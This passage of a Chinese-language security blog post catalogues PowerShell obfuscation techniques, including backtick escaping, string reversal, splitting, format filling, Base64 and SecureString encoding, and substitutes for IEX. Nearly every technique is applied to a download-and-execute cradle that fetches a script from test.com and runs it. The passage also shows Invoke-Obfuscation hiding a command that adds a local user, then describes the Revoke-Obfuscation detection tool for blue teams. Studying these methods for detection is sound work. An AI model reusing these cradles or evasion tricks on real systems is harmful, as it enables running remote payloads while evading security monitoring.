+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">.(${`</span><span class="n">E</span><span class="p">`</span><span class="n">x</span><span class="p">`</span><span class="n">e</span><span class="p">`</span><span class="n">c</span><span class="p">`</span><span class="n">u</span><span class="p">`</span><span class="n">T</span><span class="p">`</span><span class="n">i</span><span class="p">`</span><span class="n">o</span><span class="p">`</span><span class="n">N</span><span class="p">`</span><span class="n">C</span><span class="p">`</span><span class="n">o</span><span class="p">`</span><span class="n">N</span><span class="p">`</span><span class="n">T</span><span class="p">`</span><span class="n">e</span><span class="p">`</span><span class="n">x</span><span class="p">`</span><span class="n">T</span><span class="p">}.</span><span class="s2">&#34;`I</span><span class="se">`N`V</span><span class="s2">`o`k`e`C`o`m`m</span><span class="se">`A`N</span><span class="s2">`d&#34;</span><span class="p">).</span><span class="s2">&#34;</span><span class="se">`N</span><span class="s2">`e`w`S`c</span><span class="se">`R</span><span class="s2">`i`p</span><span class="se">`T`B</span><span class="s2">`l`o`c`k&#34;</span><span class="p">((&amp;</span> <span class="p">(`</span><span class="n">G</span><span class="p">`</span><span class="n">C</span><span class="p">`</span><span class="n">M</span> <span class="p">*</span><span class="n">w-O</span><span class="p">*)</span><span class="s2">&#34;</span><span class="se">`N</span><span class="s2">`e</span><span class="se">`T</span><span class="s2">`.`W`e</span><span class="se">`B</span><span class="s2">`C`l`i`e</span><span class="se">`N`T</span><span class="s2">&#34;</span><span class="p">).</span><span class="s2">&#34;`D`o`w</span><span class="se">`N</span><span class="s2">`l`o</span><span class="se">`A</span><span class="s2">`d`S</span><span class="se">`T`R</span><span class="s2">`i</span><span class="se">`N</span><span class="s2">`g&#34;</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">+</span><span class="s1">&#39;ttp://test.com/power&#39;</span><span class="p">))</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.4 字符串处理</strong></p>
+
+<p><strong>反转</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$reverseCmd</span><span class="p">=</span> <span class="s2">&#34;)&#39;rewop/em.lle7//:ptth&#39;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&#34;</span><span class="p">;</span>
+<span class="n">1</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="nv">$reverseCmd</span><span class="p">[-</span><span class="n">1</span><span class="p">..-(</span><span class="nv">$reverseCmd</span><span class="p">.</span><span class="n">Length</span><span class="p">)]</span> <span class="n">-Join</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">2</span><span class="p">.</span> <span class="nv">$reverseCmdCharArray</span><span class="p">=</span> <span class="nv">$reverseCmd</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">();</span> <span class="no">[Array]</span><span class="p">::</span><span class="n">Reverse</span><span class="p">(</span><span class="nv">$reverseCmdCharArray</span><span class="p">);</span> <span class="n">IEX</span> <span class="p">(</span><span class="nv">$reverseCmdCharArray</span><span class="n">-Join</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">3</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="n">-Join</span><span class="no">[RegEx]</span><span class="p">::</span><span class="n">Matches</span><span class="p">(</span><span class="nv">$reverseCmd</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;RightToLeft&#39;</span><span class="p">))</span> <span class="p">|</span> <span class="n">IEX</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>分割截断 or 替换字符</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$cmdWithDelim</span><span class="p">=</span> <span class="s2">&#34;(New-Object Net.We~~bClient).Downlo~~adString(&#39;http://test.com/power&#39;)&#34;</span><span class="p">;</span>
+<span class="n">1</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="nv">$cmdWithDelim</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="s2">&#34;~~&#34;</span><span class="p">)</span> <span class="n">-Join</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">2</span><span class="p">.</span> <span class="n">IEX</span> <span class="nv">$cmdWithDelim</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">&#34;~~&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">3</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="nv">$cmdWithDelim</span><span class="o">-Replace</span> <span class="s2">&#34;~~&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>格式填充，-f 格式化。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">//</span><span class="n">将NE</span> <span class="n">download</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">分别填到</span><span class="p">{</span><span class="n">0</span><span class="p">},{</span><span class="n">1</span><span class="p">},{</span><span class="n">2</span><span class="p">}</span>
+<span class="n">IEX</span> <span class="p">(</span><span class="s1">&#39;({0}w-Object {0}t.WebClient).{1}String(&#34;{2}test.com/power&#34;)&#39;</span> <span class="o">-f</span> <span class="s1">&#39;Ne&#39;</span><span class="p">,</span> <span class="s1">&#39;Download&#39;</span><span class="p">,</span><span class="s1">&#39;http://&#39;</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="p">//</span><span class="n">示例2</span>
+<span class="p">.(</span><span class="s2">&#34;{1}{0}&#34;</span> <span class="o">-f</span> <span class="s1">&#39;X&#39;</span><span class="p">,</span><span class="s1">&#39;IE&#39;</span><span class="p">)</span> <span class="p">(&amp;(</span><span class="s2">&#34;{3}{2}{1}{0}&#34;</span> <span class="o">-f</span> <span class="s1">&#39;ct&#39;</span><span class="p">,</span><span class="s1">&#39;-Obje&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="s1">&#39;Ne&#39;</span><span class="p">)</span> <span class="p">(</span><span class="s2">&#34;{0}{2}{1}&#34;</span> <span class="o">-f</span> <span class="s1">&#39;N&#39;</span><span class="p">,</span><span class="s1">&#39;nt&#39;</span><span class="p">,</span><span class="s1">&#39;et.WebClie&#39;</span><span class="p">)).(</span><span class="s2">&#34;{2}{0}{1}{3}&#34;</span> <span class="o">-f</span> <span class="s1">&#39;dSt&#39;</span><span class="p">,</span><span class="s1">&#39;rin&#39;</span><span class="p">,</span><span class="s1">&#39;Downloa&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">((</span><span class="s2">&#34;{5}{0}{3}{4}{1}{2}&#34;</span> <span class="o">-f</span> <span class="s1">&#39;tp:/&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;wer&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;test.com/p&#39;</span><span class="p">,</span><span class="s1">&#39;ht&#39;</span><span class="p">))</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>变量拼接</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$c1</span><span class="p">=</span><span class="s2">&#34;(New-Object Net.We&#34;</span><span class="p">;</span> <span class="nv">$c2</span><span class="p">=</span><span class="s2">&#34;bClient).Downlo&#34;</span><span class="p">;</span> <span class="nv">$c3</span><span class="p">=</span><span class="s2">&#34;adString(&#39;http://test.com/power&#39;)&#34;</span><span class="p">;</span>
+<span class="n">1</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="nv">$c1</span><span class="p">,</span><span class="nv">$c2</span><span class="p">,</span><span class="nv">$c3</span> <span class="n">-Join</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">2</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="nv">$c1</span><span class="p">,</span><span class="nv">$c3</span> <span class="n">-Join</span> <span class="nv">$c2</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">3</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="no">[string]</span><span class="p">::</span><span class="n">Join</span><span class="p">(</span><span class="nv">$c2</span><span class="p">,</span><span class="nv">$c1</span><span class="p">,</span><span class="nv">$c3</span><span class="p">))</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">4</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="no">[string]</span><span class="p">::</span><span class="n">Concat</span><span class="p">(</span><span class="nv">$c1</span><span class="p">,</span><span class="nv">$c2</span><span class="p">,</span><span class="nv">$c3</span><span class="p">))</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">5</span><span class="p">.</span> <span class="n">IEX</span> <span class="p">(</span><span class="nv">$c1</span><span class="p">+</span><span class="nv">$c2</span><span class="p">+</span><span class="nv">$c3</span><span class="p">)</span> <span class="p">|</span> <span class="n">IEX</span>
+<span class="n">6</span><span class="p">.</span> <span class="n">IEX</span> <span class="s2">&#34;$c1$c2$c3&#34;</span> <span class="p">|</span> <span class="n">IEX</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.5 编码</strong></p>
+
+<p><strong>Ascii</strong></p>
+
+<p>使用<code>[char]xx</code>代替字符 如：<code>[char]59–&gt;;</code>`</p>
+
+<p>不用分号<br />
+<code>$cmd= &quot;$c1~~$c2~~$c3~~$c4&quot;; IEX $cmd.Replace(&quot;~~&quot;,[string]([char]59)) | IEX</code></p>
+
+<p><strong>Base64</strong></p>
+
+<p>命令行参数使用</p>
+
+<p><code>-EC,-EncodedCommand,-EncodedComman,-EncodedComma,-EncodedComm,......,Enc,-En,E</code><br />
+解码echo 123 的base64  ZQBjAGgAbwAgADEAMgAzAAoA</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.PS 2.0 -&gt;  [C`onv`ert]::&#34;FromB`Ase6`4Str`ing&#34;(&#39;ZQBjAGgAbwAgADEAMgAzAAoA&#39;)
+2.PS 3.0+ -&gt; [ &lt;##&gt; Convert &lt;##&gt; ]:: &lt;##&gt; &#34;FromB`Ase6`4Str`ing&#34;(&#39;ZQBjAGgAbwAgADEAMgAzAAoA&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p><strong>.NET的方法</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;ZQBjAGgAbwAgADEAMgAzAAoA&#39;)))</pre></td></tr></table>
+</div>
+</div>
+<p>其他不同的方式编码 <code>hex/octal/binary/BXOR/etc</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[Convert]::ToString(1234, 2)
+[Convert]::ToString(1234, 8)
+[Convert]::ToString(1234, 16)</pre></td></tr></table>
+</div>
+</div>
+<p>也是转换为16进制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="s2">&#34;{0:X4}&#34;</span> <span class="o">-f</span> <span class="n">1234</span>  <span class="n">小写</span><span class="err">：</span> <span class="s2">&#34;{0:x4}&#34;</span> <span class="o">-f</span> <span class="n">1234</span>
+<span class="no">[Byte][Char]</span><span class="p">(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToInt16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))</span>
+<span class="p">(</span><span class="nv">$cmd</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">()</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="no">[int]</span><span class="nv">$_</span><span class="p">})</span> <span class="n">-Join</span> <span class="nv">$delim</span>   <span class="p">//</span><span class="n">可以去掉空白</span> <span class="n">-Join</span><span class="nv">$delim</span>
+<span class="nv">$bytes</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">-BXOR</span> <span class="n">0x6A</span>                <span class="p">//</span><span class="n">可以去点空白</span>  <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="n">-BXOR0x6A</span><span class="p">)</span>
+<span class="n">SecureString</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>关于SecureString</strong>: <code>Get-Comamnd *secure-string*</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">www</span><span class="p">.</span><span class="n">pdq</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">blog</span><span class="p">/</span><span class="n">secure-password-with-powershell-encrypting-credentials-part</span><span class="p">-</span><span class="n">1</span><span class="p">/</span>
+ <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">www</span><span class="p">.</span><span class="n">pdq</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">blog</span><span class="p">/</span><span class="n">secure-password-with-powershell-encrypting-credentials-part</span><span class="p">-</span><span class="n">2</span><span class="p">/</span>
+<span class="nv">$secPwd</span><span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&#34;Enter password&#34;</span> <span class="n">-AsSecureString</span>
+<span class="nv">$secPwd</span><span class="p">=</span> <span class="s2">&#34;echo 123&#34;</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<span class="nv">$secPwd</span><span class="p">|</span> <span class="nb">ConvertFrom-SecureString</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>加密指定key</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$cmd= &#34;code&#34;
+$secCmd= ConvertTo-SecureString $cmd -AsPlainText -Force
+$secCmdPlaintext= $secCmd| ConvertFrom-SecureString -Key (1..16)
+$secCmdPlaintext</pre></td></tr></table>
+</div>
+</div>
+<p><strong>解密</strong></p>
+
+<p><code>echo xxxx| ConvertTo-SecureString -Key (1..16)</code><br />
+<strong>示例</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$cmd= &#34;echo 123&#34;
+$secCmd= ConvertTo-SecureString $cmd -AsPlainText -Force
+$secCmdPlaintext= $secCmd| ConvertFrom-SecureString -Key (1..16)</pre></td></tr></table>
+</div>
+</div>
+<p>运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$secCmd= $secCmdPlaintext| ConvertTo-SecureString -Key (1..16);([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secCmd))) | IEX</pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.6 自构造关键字替换</strong></p>
+
+<p>就是在其他命令的输出下查看观察目标字符串位置，然后提取出来。比如DownlaodString的构造替换</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">DownloadString == (((New-Object Net.WebClient).PsObject.Methods | Where-Object {$_.Name -like &#39;*wn*d*g&#39;}).Name)
+IEX (New-Object Net.WebClient).(((New-Object Net.WebClient).PsObject.Methods | Where-Object {$_.Name -like &#39;*wn*d*g&#39;}).Name).Invoke(&#39;http://test.com/power&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p>再结合get-command的变形</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">IEX (.(COMMAND *w-*ct) Net.WebClient).(((.(COMMAND *w-*ct) Net.WebClient).PsObject.Methods | Where-Object {$_.Name -like &#39;*wn*d*g&#39;}).Name).Invoke(&#39;http://test.com/power&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p>根据这样的思路结合上面提到的获取环境变量方法，可以把New-Object层层混淆为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">(GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).(((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).PsObject.Methods|Where{(GCI Variable:_).Value.Name-ilike&#39;*Co*d&#39;}).Name).Invoke((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).(((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name)|GM|Where{(GCI Variable:_).Value.Name-ilike&#39;G*om*e&#39;}).Name).Invoke(&#39;N*ct&#39;,$TRUE,1), [System.Management.Automation.CommandTypes]::Cmdlet)</pre></td></tr></table>
+</div>
+</div>
+<h2 id="3-iex-的处理与其他执行方法">3. IEX 的处理与其他执行方法</h2>
+
+<p>经过上面构造可以看到很多都使用Invoke-Expression/IEX命令，.，&amp;符号来执行表达式。</p>
+
+<p>Invoke-Expression/IEX命令是很常用的一个命令， 运行一个以字符串形式提供的PowerShell表达式。</p>
+
+<p>这里也先看看代替IEX的各种执行方式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Get-Alias/GAL
+
+
+&amp;(GAL I*X)
+.(LS Alias:/I*X)
+Get-Command/GCM
+.(GCM I*e-E*)
+&amp;(Command I*e-E*)
+
+GetCmdlets (PS1.0+),
+
+$ExecutionContext.InvokeCommand.GetCmdlets(&#39;I*e-E*&#39;),
+//用到环境变量
+&amp;(GV E*Cont* -Va).InvokeCommand.(((GV E*Cont* -Va).InvokeCommand.PsObject.Methods|Where{(GV _ -Va).Name -clike&#39;*Cm*ts&#39;}).Name).Invoke(&#39;I*e-E*&#39;)
+InvokeScript (PS1.0+)
+
+$ExecutionContext.InvokeCommand.InvokeScript($Script)
+(GV E*Cont* -Va).InvokeCommand.(((GV E*Cont* -Va).InvokeCommand.PsObject.Methods|Where{(GV _ -Va).Name -clike&#39;I*&#39;}).Name).Invoke($Script),
+Invoke-Command/ICM
+
+Invoke-Command ([ScriptBlock]::Create($Script))
+[ScriptBlock]::Create($Script).Invoke()
+.((GV *cut*t -Va).(((GV *cut*t -Va)|Member)[6].Name).(((GV *cut*t -Va).(((GV *cut*t -Va)|Member)[6].Name)|Member|Where-Object{(Get-Variable _ -Va).Name-clike&#39;N*S*B*&#39;}).Name).Invoke($Script))
+PS Runspace
+
+[PowerShell]::Create().AddScript($Script).Invoke()
+Invoke-AsWorkflow (PS3.0+)
+Invoke-AsWorkflow -Expression $Script
+提取串联出IEX，也是在其他命令的输出下查看观察目标字符串位置，然后提取出来。
+
+($Env:ComSpec[4,26,25]-Join&#39;&#39;)
+((LS env:/Co*pec).Value[4,26,25]-Join&#39;&#39;)
+($ShellId[1]+$ShellId[13]+&#39;x&#39;)
+((GV S*ell*d -Va)[1]+(DIR Variable:S*ell*d).Value[13]+&#39;x&#39;)
+( ([String]&#39;&#39;.IndexOf)[0,7,8]-Join&#39;&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p>怎么构造?，比如上面这个 首先查看<code>''|Get-Member</code>有个<code>IndexOf</code>方法，然后看看<code>[String]''.IndexOf</code>的输出，提取出里面的IEX字母</p>
+
+<h2 id="4-相关工具">4. 相关工具</h2>
+
+<p>**4.1 <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a><br />
+那么讲了这么多，其实只是给大家讲了一下有这种编码方式，对于蓝队来说需要更深入的掌握，当让red team需要掌握的就更多了，下面给大家介绍几款混淆和编码框架供大家学习。<br />
+<code>Invoke-Obfuscation</code><br />
+这个工具呢已经有dalao在freebuf上写过相关是使用方法&mdash;<a href="http://www.freebuf.com/sectool/136328.html">http://www.freebuf.com/sectool/136328.html</a></p>
+
+<p>启动命令<br />
+<code>Import-Module .\Invoke-Obfuscation.psd1</code><br />
+<code>Invoke-Obfuscation</code><br />
+启动之后输入你的代码，然后可以选择你需要的编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Invoke-Obfuscation&gt; set scriptblock &#39;net user test test /add&#39;
+Invoke-Obfuscation&gt; 1
+PS &gt; &amp; ( ([striNg]$verBOsePRefereNCe)[1,3]+&#39;x&#39;-jOIn&#39;&#39;)( [StrInG]::JOiN(&#39;&#39; , ( &#39;32k45x106O111A73f78;32}40y40!49y49k48k44O49n48!49}32x44;49!49x54A44A51O50y32x44n32f49x49A55!44n49!49;53!44x49A48;49A32y44O32!49f49k52n44}32y51}50x32y44k32k49!49n54O32!44A49O48;49x44y49A49n53y32x44A49y49n54f44n32O51}50k44}32}49;49x54!44!32n49x48f49k32O44;32O49O49f53n44;49!49n54y32}44x51;50k44x52!55!44A32n57k55!44k49A48n48;32f44y49!48n48f41y124x70;79f114;101!97k99!104;45n79;98A74O101y99;84y123}32y40!91}99}104f97y82O93k91f105n110A84f93x36y95O41n32k125k32;41y32f124x46A32}40A32f40}91y83n116k114f105A78;71O93}36;118y69x114!98;111O115n101f80y82O101!70O101A114n101;110n67!101;41;91n49!44;51k93!43y39A120!39O45}74x79k73f110A39n39;41&#39;.SpLIT(&#39;;nxfAOk!y}&#39; ) |FoReach-ObjeCt {( [Int] $_-aS [CHAR]) }) ) )</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/ps4.png" alt="图片已损坏" /></p>
+
+<p>这是一个powershell混淆编码框架，基本涵盖了上述的各种混淆方法</p>
+
+<p>**4.2 <a href="https://github.com/danielbohannon/Revoke-Obfuscation">Revoke-Obfuscation</a></p>
+
+<p>混淆检测框架,注意,这个是检测</p>
+
+<p>使用方法</p>
+
+<p><strong>初始</strong><br />
+<code>Import-Module .\Revoke-Obfuscation.psm1 -Verbose</code><br />
+gte-filehash没有输入流参数，自己下载一个get-filehash导入即可<br />
+还有个问题 使用-OutputToDisk输出时，Set-Content没有NoNewline参数，ps5.0没问题。<br />
+<strong>检测每一行的混淆情况</strong><br />
+<code>Get-Content .\test.txt|Measure-RvoObfuscation -Verbose -OutputToDisk</code></p>
+
+<p><strong>检测一个文件是否混淆</strong><br />
+<code>Get-ChildItem .\test.txt|Measure-RvoObfuscation -Verbose -OutputToDisk</code><br />
+<strong>远程检测</strong><br />
+<code>Measure-RvoObfuscation -Url 'http://bit.ly/DBOdemo1' -Verbose -OutputToDisk</code><br />
+<code>Measure-RvoObfuscation -Url 'http://test.com/powershell/rev.ps1' -Verbose</code><br />
+<strong>从事件了提取ID为4104的日志重组</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Get-ChildItem .\Demo.evtx | Get-RvoScriptBlock -Verbose
+Get-RvoScriptBlock -Path .\demo.evtx -Verbose
+这里的demo.evtx可以使用绝对路径
+Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Get-RvoScriptBlock -Verbose
+Get-ChildItem .\eventlogs.xml | Get-RvoScriptBlock -Verbose
+Get-CSEventLogEntry -LogName Microsoft-Windows-PowerShell/Operational | Get-RvoScriptBlock</pre></td></tr></table>
+</div>
+</div>
+<p><strong>从事件日志中提取然后检测</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$obfResults = Get-WinEvent -Path .\Demo.evtx | Get-RvoScriptBlock | Measure-RvoObfuscation -OutputToDisk -Verbose</pre></td></tr></table>
+</div>
+</div>
+<p>当使用上面的混淆框架<code>Invoke-Obfuscation</code>的个汇总混淆方法生成几个样本。<br />
+<img src="https://img.04z.net/img/ps5.png" alt="" /><br />
+<img src="https://img.04z.net/img/ps6.gif" alt="" /><br />
+小技巧: 当然也可以使用通配符* 来检测当前目录混淆文件</p>
+
+<p><code>Get-ChildItem * |Measure-RvoObfuscation -Verbose -OutputToDisk</code></p>
+
+<p><a href="http://www.4hou.com/penetration/8915.html">http://www.4hou.com/penetration/8915.html</a></p>
+
+<p><a href="http://bobao.360.cn/learning/detail/4764.html">http://bobao.360.cn/learning/detail/4764.html</a></p>
+
+<p><a href="http://www.pstips.net/credential-obfuscator.html">http://www.pstips.net/credential-obfuscator.html</a></p>
+
+<p><a href="https://yq.aliyun.com/articles/222396">https://yq.aliyun.com/articles/222396</a></p>
+
+<p><a href="https://rootclay.gitbooks.io/powershell-attack-guide/content/">https://rootclay.gitbooks.io/powershell-attack-guide/content/</a></p>
+
+<p><a href="http://www.freebuf.com/sectool/136328.html">http://www.freebuf.com/sectool/136328.html</a></p>
+
+<p><a href="https://www.anquanke.com/post/id/87329">https://www.anquanke.com/post/id/87329</a></p>
+
+<p><a href="https://www.anquanke.com/post/id/86637">https://www.anquanke.com/post/id/86637</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/execl-scriptlets-attack/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Execl Scriptlets Attack</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/download-remote-payload-and-exec/">
+            <span class="next-text nav-default">Download Payload AND Exec</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
